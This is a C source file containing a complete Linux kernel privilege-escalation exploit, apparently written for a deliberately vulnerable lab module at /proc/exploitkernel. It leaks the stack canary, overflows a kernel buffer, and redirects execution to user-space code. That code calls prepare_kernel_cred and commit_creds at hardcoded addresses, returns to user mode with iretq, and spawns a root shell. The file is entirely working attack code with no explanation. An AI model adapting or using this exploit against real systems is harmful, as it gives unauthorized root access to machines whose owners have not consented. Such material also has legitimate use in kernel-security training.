#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void shell(void){

    if (getuid() != 0) {
        printf("UID = %d :-(\n", getuid());
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) shell;

void escalate_privileges(void){
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "call 0xffffffff8106b6a0;" // prepare_kernel_cred
        "mov rdi, rax;"
        "call 0xffffffff8106b500;" // commit_creds
        "swapgs;"
        "push user_ss;"
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push user_rip;"
        "iretq;"
        ".att_syntax;"
    );
}

int main() {

    save_state();

    int fd = open("/proc/exploitkernel", O_RDWR);
    if (fd < 0) {
        puts("Failed to open /proc/exploitkernel");
        exit(-1);
    }

    unsigned long leak[5];;
    read(fd, leak, sizeof(leak));

    unsigned long canary = leak[1];
    printf("Canary = 0x%016lx\n", canary);

    unsigned long payload[40] = { 0 };
    payload[1] = canary;
    payload[4] = (unsigned long) escalate_privileges;

    write(fd, payload, sizeof(payload));

    return 0;
}
